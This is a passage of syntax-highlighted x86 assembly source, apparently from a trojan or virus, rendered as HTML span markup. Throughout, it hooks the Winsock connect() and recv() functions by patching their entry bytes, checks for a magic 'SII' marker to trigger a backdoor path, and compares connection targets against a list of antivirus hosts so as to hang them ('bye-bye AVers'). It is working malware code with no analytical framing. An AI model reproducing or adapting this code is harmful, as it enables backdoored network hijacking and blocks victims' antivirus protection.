   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_IsBadReadPtr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">host_back</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AV_NUM</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;   endereco AV ?</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">host_back</span><span class="sc0">

   </span><span class="sc5">av_host2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">block_host</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">av_host2</span><span class="sc0">

   </span><span class="sc5">host_back</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NETSEH</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ret_connect</span><span class="sc0">

   </span><span class="sc5">host_error</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NETSEH</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">ret_connect</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
   </span><span class="sc5">ap_connect</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">av_request_num</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">mark_crypt</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'XY'</span><span class="sc0">

   </span><span class="sc5">connect_repcode</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushf</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SII'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_connect_backdoor</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_connect_byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">no_connect_backdoor</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ap_connect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">
   </span><span class="sc5">jump_connect_byte</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">orig_connect_byte</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">push_ret_connect</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">trojan@007</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; recv()</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">recv_repcode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;   return address</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">push_ret_recv</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ap_recv</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_recv_byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   size of the buffer</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   incoming data</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   socket</span><span class="sc0">

   </span><span class="sc1">; some operation...</span><span class="sc0">

   </span><span class="sc5">ret_recv</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
   </span><span class="sc5">ap_recv</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">recv_repcode</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushf</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SII'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_recv_backdoor</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jump_recv_byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">no_recv_backdoor</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ap_recv</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">
   </span><span class="sc5">jump_recv_byte</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">orig_recv_byte</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">push_ret_recv</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">rnd</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2df5a7ech</span><span class="sc0">
   </span><span class="sc5">matrix</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
   </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7FFFFFFFh</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">matrix</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">block_host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;   bye-bye AVers...</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;  b64</span><span class="sc0">

   </span><span class="sc5">trojan@002</span><span class="sc4">:</span><span class="sc0">
</span></div></body>
</html>
